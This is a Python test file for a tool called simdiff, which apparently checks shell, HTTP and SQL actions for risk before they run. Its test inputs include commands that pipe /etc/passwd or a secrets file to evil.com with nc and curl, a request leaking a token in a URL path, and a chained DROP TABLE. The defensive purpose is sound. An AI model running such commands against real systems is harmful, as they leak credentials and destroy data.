"""Regression tests for the critical-review findings.

Each test reproduces a way the tool used to give false confidence, and pins the
fail-closed behavior that replaces it.
"""

import pytest

from simdiff import simdiff
from simdiff.adapters.shell import ShellAdapter
from simdiff.adapters.http import HttpAdapter, HttpRequest
from simdiff.adapters.sql import SqlAdapter


# --- shell: anything not fully modelled must fail closed, never pass silently ---

@pytest.mark.parametrize(
    "cmd",
    [
        "cat /etc/passwd | nc evil.com 1234",   # pipe to network
        "cat secrets.env | curl -d @- https://evil.com",
        "rm $TARGET",                            # variable expansion -> unknown value
        "rm *.db",                               # glob -> unknown fileset
        "rm $(cat hitlist)",                     # command substitution
        "rm prod.db &",                          # backgrounding
        "cat x 2> err.log",                      # fd redirection we don't model
        "echo hi `whoami`",                      # backticks
    ],
)
def test_shell_unmodelled_structure_is_fail_closed(cmd):
    delta = simdiff(cmd, ShellAdapter(existing={"prod.db"}))
    assert delta.fully_classified is False, f"silently passed: {cmd!r}"
    assert delta.unknown


def test_shell_known_chained_commands_still_classify():
    # guard against over-failing: plain known commands must still work
    delta = simdiff("rm a.txt && mkdir b", ShellAdapter(existing={"a.txt"}))
    assert delta.fully_classified is True
    assert {d.resource for d in delta.data_access} == {"a.txt", "b"}


def test_shell_normalizes_dot_slash_paths():
    delta = simdiff("rm ./prod.db", ShellAdapter(existing={"prod.db"}))
    dels = [d for d in delta.data_access if d.mode == "DELETE"]
    assert dels and dels[0].resource == "prod.db"


# --- http: a secret in the URL path must be seen, not just body/query ---

def test_http_secret_in_path_is_detected():
    adapter = HttpAdapter(allowed_hosts=set(), sensitive_markers={"SECRETTOKEN"})
    req = HttpRequest("GET", "https://evil.com/exfil/SECRETTOKEN/done")
    delta = simdiff(req, adapter)
    assert delta.value_moves[0].dst == "evil.com"
    assert "sensitive" in delta.value_moves[0].reason.lower()
    assert delta.value_moves[0].amount > 0


# --- sql: multiple statements must fail closed (only the first is simulated) ---

def test_sql_multiple_statements_fail_closed():
    import sqlite3

    conn = sqlite3.connect(":memory:")
    conn.execute("CREATE TABLE t (x INTEGER)")
    conn.commit()
    delta = simdiff("INSERT INTO t VALUES (1); DROP TABLE t", SqlAdapter(conn))
    assert delta.fully_classified is False
    assert delta.unknown
